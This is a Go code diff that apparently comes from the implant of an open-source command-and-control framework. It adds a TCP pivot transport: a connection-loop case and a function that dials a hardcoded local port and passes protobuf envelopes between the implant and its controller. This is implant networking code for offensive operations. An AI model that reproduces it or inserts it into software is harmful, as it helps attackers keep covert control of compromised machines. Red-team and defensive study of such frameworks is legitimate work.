@@ -22,7 +22,7 @@ import (
 	"crypto/x509"
 	"io"
 
-	// {{if .HTTPc2Enabled}}
+	// {{if or .HTTPc2Enabled .TCPPivotc2Enabled}}
 	"net"
 	// {{end}}
 	"net/url"
@@ -177,6 +177,18 @@ func StartConnectionLoop() *Connection {
 			// {{end}}
 			connectionAttempts++
 			// {{end}} -NamePipec2Enabled
+		case "tcppivot":
+			// {{if .TCPPivotc2Enabled}}
+			connection, err = tcpPivotConnect(uri)
+			if err == nil {
+				activeC2 = uri.String()
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[tcppivot] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}} -TCPPivotc2Enabled
 		default:
 			// {{if .Debug}}
 			log.Printf("Unknown c2 protocol %s", uri.Scheme)
@@ -488,6 +500,62 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} -NamePipec2Enabled
+
+// {{if .TCPPivotc2Enabled}}
+func tcpPivotConnect(uri *url.URL) (*Connection, error) {
+	conn, err := net.Dial("tcp", "127.0.0.1:9898")
+	if err != nil {
+		return nil, err
+	}
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[tcp-pivot] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Debug}}
+			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			tcpPivoteWriteEnvelope(&conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := tcpPivotReadEnvelope(&conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Debug}}
+				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	return connection, nil
+}
+
+// {{end}} -TCPPivotc2Enabled
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
 // we have to disable all of the fucking certificate validation and re-implement everything.
